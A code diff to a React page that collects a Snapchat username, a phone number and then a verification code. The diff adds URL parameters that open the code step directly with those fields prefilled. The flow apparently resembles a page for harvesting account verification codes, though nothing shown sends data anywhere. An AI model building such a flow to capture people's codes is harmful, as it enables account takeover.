@@ -5,9 +5,16 @@ import SuccessScreen from "@/components/SuccessScreen";
 import CodeVerification from "@/components/CodeVerification";
 
 export default function Home() {
-  const [step, setStep] = useState("form"); // "form" | "code" | "success"
+  const urlParams = new URLSearchParams(window.location.search);
+  const initialStep = urlParams.get("step") === "code" ? "code" : "form";
+  const initialData = initialStep === "code" ? {
+    snapchat: urlParams.get("snap") || "",
+    telephone: urlParams.get("tel") || "",
+  } : null;
+
+  const [step, setStep] = useState(initialStep);
   const [loading, setLoading] = useState(false);
-  const [submittedData, setSubmittedData] = useState(null);
+  const [submittedData, setSubmittedData] = useState(initialData);
 
   const handleSubmit = async (data) => {
     setLoading(true);
@@ -20,7 +27,6 @@ export default function Home() {
 
   const handleCodeSubmit = async (code) => {
     setLoading(true);
-    // Just show success after code entry
     setStep("success");
     setLoading(false);
   };
@@ -34,6 +40,7 @@ export default function Home() {
         {step === "form" && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
         {step === "code" && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
         {step === "success" && <SuccessScreen data={submittedData} />}
+
       </div>
     </div>
   );
